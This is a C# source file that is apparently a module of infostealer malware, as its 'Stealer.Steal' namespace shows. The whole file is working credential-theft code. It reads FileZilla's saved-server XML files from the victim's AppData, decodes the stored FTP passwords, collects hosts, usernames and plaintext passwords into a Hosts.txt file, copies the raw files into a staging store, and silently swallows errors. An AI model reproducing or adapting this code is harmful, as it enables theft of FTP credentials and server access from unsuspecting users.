using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Server;

internal class FileZilla
{
	public static string[] GetPswPath()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
		return new string[2]
		{
			text + "recentservers.xml",
			text + "sitemanager.xml"
		};
	}

	public static void Start()
	{
		try
		{
			string[] pswPath = GetPswPath();
			if (!File.Exists(pswPath[0]) && !File.Exists(pswPath[1]))
			{
				return;
			}
			string path = Path.Combine("Server", "FileZilla");
			List<string> list = new List<string>();
			string[] array = pswPath;
			foreach (string text in array)
			{
				try
				{
					if (!File.Exists(text))
					{
						continue;
					}
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(text);
					foreach (XmlNode item in xmlDocument.GetElementsByTagName("Server"))
					{
						string text2 = item?["Pass"]?.InnerText;
						if (text2 != null)
						{
							string text3 = "ftp://" + item["Host"]?.InnerText + ":" + item["Port"]?.InnerText + "/";
							string text4 = item["User"]?.InnerText;
							string @string = Encoding.UTF8.GetString(Convert.FromBase64String(text2));
							Counter.FtpHosts++;
							list.Add("Url: " + text3 + "\nUsername: " + text4 + "\nPassword: " + @string);
						}
					}
					DynamicFiles.WriteAllBytes(Path.Combine(path, new FileInfo(text).Name), File.ReadAllBytes(text));
				}
				catch (Exception)
				{
				}
			}
			DynamicFiles.WriteAllText(Path.Combine(path, "Hosts.txt"), string.Join("\n\n", list.ToArray()));
		}
		catch
		{
		}
	}
}
